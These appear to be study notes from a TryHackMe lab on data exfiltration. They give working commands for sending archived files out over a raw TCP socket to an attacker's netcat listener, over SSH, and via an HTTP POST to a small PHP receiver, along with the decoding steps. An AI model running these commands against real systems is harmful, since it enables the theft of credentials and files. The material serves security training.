# Data Exfiltration Techniques

Reference: https://tryhackme.com/room/dataxexfilt

## TCP Socket Data Exfil

Prepare to receive file with netcat(on attacker box):
```
nc -lvp 8080 > /tmp/task4-creds.data
```

Use TCP Socket to exfiltrate data:

1. We used the tar command to create an archive file with the zcf arguments of the content of the secret directory.

2. The z is for using gzip to compress the selected folder, the c is for creating a new archive, and the f is for using an archive file.

3. We then passed the created tar file to the base64 command for converting it to base64 representation.

4. Then, we passed the result of the base64 command to create and copy a backup file with the dd command using EBCDIC encoding data.

5. Finally, we redirect the dd command's output to transfer it using the TCP socket on the specified IP and port, which in this case, port 8080.
```
tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080
```

Convert the data back to its original status(On attacker box):
```
dd conv=ascii if=task4-creds.data |base64 -d > task4-creds.tar
```

Use the tar command to unpack the data(On attacker box):
```
tar xvf task4-creds.tar
```

## SSH Data exfiltration

Tar files and tansfer to another box via ssh and untar the files:
1. We used the tar command the same as the previous task to create an archive file of the task5 directory.

2. Then we passed the archived file over the ssh. SSH clients provide a way to execute a single command without having a full session.

3. We passed the command that must be executed in double quotations, "cd /tmp/; tar xpf. In this case, we change the directory and unarchive the passed file.
```
tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"
```

## HTTP Data exfiltration

Contact.php code:
```
<?php
if (isset($_POST['file'])) {
        $file = fopen("/tmp/http.bs64","w");
        fwrite($file, $_POST['file']);
        fclose($file);
}
?>
```

Extract files and send to webserver:
```
curl --data "file=$(tar zcf - task6 | base64)" http://web.thm.com/contact.php
```

Fix empty spaces in base 64 file with sed:
```
sudo sed -i 's/ /+/g' /tmp/http.bs64
```



